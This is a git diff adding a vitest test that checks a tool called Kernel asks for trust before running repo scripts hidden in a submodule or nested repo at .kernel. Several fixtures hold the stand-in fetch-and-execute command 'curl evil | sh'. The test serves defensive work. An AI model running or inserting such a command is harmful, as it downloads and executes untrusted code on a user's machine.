@@ -1,5 +1,5 @@
 import { afterEach, describe, expect, it, vi } from 'vitest'
-import { mkdir, mkdtemp, readFile, stat, symlink, writeFile } from 'node:fs/promises'
+import { mkdir, mkdtemp, readFile, realpath, stat, symlink, writeFile } from 'node:fs/promises'
 import { tmpdir } from 'node:os'
 import { join } from 'node:path'
 import { Kernel } from '../src/main/kernel'
@@ -587,6 +587,51 @@ describe("trusting a room's scripts (KERNEL-209)", () => {
     await symlink(join('..', 'cfg', 'local.toml'), join(file, '.kernel', 'settings.local.toml'))
     expect(await localSettingsOwn(file)).toBe(false)
     expect(scriptsToTrust(await loadRepoSettings(file), { localIsOwn: await localSettingsOwn(file) })).toMatchObject({ scripts: { run: 'curl evil | sh' } })
+  }, 60000)
+
+  it('asks for a personal file in a submodule or a repo nested at .kernel', async () => {
+    const agents = {
+      'README.md': '# client\n',
+      '.claude/agents/rowan.md': '---\nname: rowan\ndescription: Lead.\nlead: true\n---\nYou are Rowan.',
+      '.claude/agents/kai.md': '---\nname: kai\ndescription: Frontend engineer.\n---\nYou are Kai.'
+    }
+    // The repo commits .kernel as a submodule whose own repo holds the personal file, populated as a clone with
+    // --recurse-submodules would leave it. The outer repo tracks no such file, and no link is on the way.
+    const sub = await tempRepo({ 'settings.local.toml': '[scripts]\nsetup = "curl evil | sh"\n' })
+    const outer = await tempRepo(agents)
+    await run('git', ['-C', outer, '-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, '.kernel'])
+    await run('git', ['-C', outer, 'commit', '-q', '-m', 'submodule'])
+    expect(await readFile(join(outer, '.kernel', 'settings.local.toml'), 'utf8')).toContain('curl evil')
+    expect(await localSettingsOwn(outer)).toBe(false)
+    const { k, room, h } = await kernelFor(outer)
+    expect(await h['rooms.scriptTrust']({ roomId: room.id })).toMatchObject({ scripts: { setup: 'curl evil | sh' } })
+    await k.stop()
+
+    // Not populated (deinit leaves an empty folder that git places in the outer repo): the gitlink alone asks, staged
+    // in the index or committed in HEAD.
+    const empty = await tempRepo(agents)
+    await run('git', ['-C', empty, '-c', 'protocol.file.allow=always', 'submodule', 'add', '-q', sub, '.kernel'])
+    await run('git', ['-C', empty, 'submodule', 'deinit', '-q', '-f', '.kernel'])
+    expect((await exec('git', ['-C', join(empty, '.kernel'), 'rev-parse', '--show-toplevel'])).stdout.trim()).toBe(await realpath(empty))
+    expect(await localSettingsOwn(empty)).toBe(false)
+    await run('git', ['-C', empty, 'commit', '-q', '-m', 'submodule'])
+    expect(await localSettingsOwn(empty)).toBe(false)
+    // Left only in HEAD.
+    await run('git', ['-C', empty, 'rm', '-q', '--cached', '.kernel'])
+    expect((await exec('git', ['-C', empty, 'ls-files', '-s', '--', '.kernel'])).stdout).toBe('')
+    expect(await localSettingsOwn(empty)).toBe(false)
+
+    // A repo of its own at .kernel, never added to the outer one.
+    const nested = await tempRepo(agents)
+    await mkdir(join(nested, '.kernel'))
+    await run('git', ['init', '-q', join(nested, '.kernel')])
+    await writeFile(join(nested, '.kernel', 'settings.local.toml'), '[scripts]\nrun = "curl evil | sh"\n')
+    expect(await localSettingsOwn(nested)).toBe(false)
+
+    // The ordinary room still counts: settings.toml committed beside an untracked personal file.
+    const own = await tempRepo({ ...agents, '.gitignore': '.kernel/settings.local.toml\n', '.kernel/settings.toml': '[scripts]\nsetup = "pnpm install"\n' })
+    await writeFile(join(own, '.kernel', 'settings.local.toml'), '[scripts]\nrun = "pnpm dev"\n')
+    expect(await localSettingsOwn(own)).toBe(true)
   }, 60000)
 
   it('asks for a personal file committed in another case, which a case-insensitive disk reads as the real one', async () => {
